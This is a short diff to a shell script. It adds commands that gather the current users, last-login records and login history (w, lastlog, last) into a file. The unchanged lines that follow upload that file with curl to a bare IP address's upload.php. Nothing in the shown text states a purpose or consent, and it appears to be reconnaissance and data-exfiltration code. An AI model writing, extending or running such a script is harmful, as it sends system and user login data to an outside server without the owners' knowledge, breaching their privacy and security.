@@ -47,6 +47,18 @@ eval $CMD >> $NAME
 echo "Total: `eval $CMD | wc -l`" >> $NAME
 echo "----" >> $NAME
 
+CMD="w"
+eval $CMD >> $NAME
+echo "----" >> $NAME
+
+CMD="lastlog"
+eval $CMD >> $NAME
+echo "----" >> $NAME
+
+CMD="last"
+eval $CMD >> $NAME
+echo "----" >> $NAME
+
 CMD="curl -F 'my_file=@$NAME' http://18.166.106.254/upload.php"
 eval $CMD
 echo "EOF"
